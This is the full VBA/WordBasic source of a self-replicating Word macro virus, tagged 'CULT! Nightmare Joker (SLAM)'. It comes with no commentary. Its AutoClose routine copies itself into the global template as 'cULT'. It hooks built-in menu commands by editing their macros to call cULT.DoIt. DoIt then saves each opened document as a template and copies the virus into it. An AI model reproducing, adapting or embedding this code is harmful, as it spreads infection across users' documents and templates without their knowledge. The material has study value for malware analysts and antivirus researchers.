   Attribute VB_Name = "AuToClOsE"

   Private Function Name1$(h$)
   Dim a$
   Dim x
   Dim i
   Dim l
   Dim d$
   Dim e$
   Dim z
   Dim AA$
   Dim y
   Dim k$
   Dim CC$
   a$ = WordBasic.[MenuText$](0, 1, 0)
   x = Len(a$) + 1: i = 1: l = 1
   Again:
   If i = x Then GoTo GOON
   d$ = Mid(a$, i, 1)
   If d$ = Chr(38) Or d$ = Chr(46) Or d$ = Chr(32) Then
       i = i + 1
       GoTo Again
   Else
       e$ = e$ + d$
       i = i + 1
       GoTo Again
   End If
   GOON:
   z = Len(e$) + 1
   AA$ = WordBasic.[MenuItemText$](e$, 0, 1, 0)
   y = Len(AA$) + 1
   Again2:
   If l = y Then GoTo Finish
   k$ = Mid(AA$, l, 1)
   If k$ = "&" Or k$ = Chr(46) Or k$ = Chr(32) Or k$ = "-" Or k$ = "/" Then
       l = l + 1
       GoTo Again2
   Else
       CC$ = CC$ + k$
       l = l + 1
       GoTo Again2
   End If
   Finish:
   h$ = WordBasic.[Left$](CC$, z)
   Name1$ = e$ + h$
   End Function

   Private Function Name2$(h$)
   Dim a$
   Dim x
   Dim i
   Dim l
   Dim d$
   Dim e$
   Dim z
   Dim AA$
   Dim y
   Dim k$
   Dim CC$
   a$ = WordBasic.[MenuText$](0, 1, 0)
   x = Len(a$) + 1: i = 1: l = 1
   Again:
   If i = x Then GoTo GOON
   d$ = Mid(a$, i, 1)
   If d$ = Chr(38) Or d$ = Chr(46) Or d$ = Chr(32) Then
       i = i + 1
       GoTo Again
   Else
       e$ = e$ + d$
       i = i + 1
       GoTo Again
   End If
   GOON:
   z = Len(e$) + 1
   AA$ = WordBasic.[MenuItemText$](e$, 0, 2, 0)
   y = Len(AA$) + 1
   Again2:
   If l = y Then GoTo Finish
   k$ = Mid(AA$, l, 1)
   If k$ = "&" Or k$ = Chr(46) Or k$ = Chr(32) Or k$ = "-" Or k$ = "/" Then
       l = l + 1
       GoTo Again2
   Else
       CC$ = CC$ + k$
       l = l + 1
       GoTo Again2
   End If
   Finish:
   h$ = WordBasic.[Left$](CC$, z)
   Name2$ = e$ + h$
   End Function

   Public Sub MAIN()
   Dim o
   Dim k
   Dim m$
   Dim h$
   Dim n$
   If WordBasic.CountMacros(0) > 0 Then
   For o = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](o, 0) = "cULT" Then
       k = 1
   End If
   Next o
   If k = 1 Then
       GoTo Finish
   Else
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AuToClOsE", "Global:cULT"
       WordBasic.ScreenUpdating
       m$ = Name1$(h$): n$ = Name2$(h$)
       WordBasic.ToolsMacro Name:=m$, Show:=1, Edit:=1
       InsertCode
       WordBasic.ToolsMacro Name:=n$, Show:=1, Edit:=1
       InsertCode
       WordBasic.FileSaveAll 1, 1
       WordBasic.ScreenUpdating
   End If
   Finish:

   Rem CULT! Nightmare Joker (SLAM)

   End If
   End Sub

   Private Sub InsertCode()
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.CharRight 10
   WordBasic.Insert Chr(32)
   WordBasic.StartOfDocument
   WordBasic.LineDown 4
   WordBasic.EndOfLine
   WordBasic.InsertPara
   WordBasic.Insert "cULT.DoIt"
   WordBasic.DocClose 1
   End Sub

   Private Sub DoIt()
   Dim o
   Dim Infect
   On Error GoTo -1: On Error GoTo Finish
   If WordBasic.CountMacros(1) > 0 Then
   For o = 1 To WordBasic.CountMacros(1)
       If WordBasic.[MacroName$](o, 1) = "AuToClOsE" Then
               Infect = 1
       End If
   Next o
   End If
   If Infect = 0 Then
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:cULT", WordBasic.[WindowName$]() + ":AuToClOsE"
   WordBasic.FileSaveAll 1, 1
   End If
   End Sub
